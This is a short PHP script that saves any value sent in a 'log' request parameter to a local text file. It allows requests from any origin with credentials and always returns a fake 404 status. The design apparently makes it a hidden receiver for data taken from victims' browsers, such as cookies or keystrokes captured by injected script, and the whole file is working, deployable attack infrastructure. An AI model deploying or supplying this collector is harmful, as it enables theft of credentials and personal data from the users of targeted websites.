<?php

/**
 * Log file path
 */
$logName  = './log.txt';

/**
 * log requrest parameter
 */
$parameterName = 'log';

/**
 * Set liberal access control headers
 */
header('Access-Control-Allow-Methods: GET');
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: Content-Type, *');
header($_SERVER['SERVER_PROTOCOL'] . ' 404 Not Found', true, 404);

/**
 * create a log file if one does not exist
 */
if (!is_file($logName)) {
    file_put_contents($logName, '');
}

/**
 * Write request contents to log
 */
$file = fopen($logName, 'a');
if (isset($_REQUEST[$parameterName]) && !empty($_REQUEST[$parameterName])) {
    fwrite($file, $_REQUEST['log']);
    fclose($file);
}
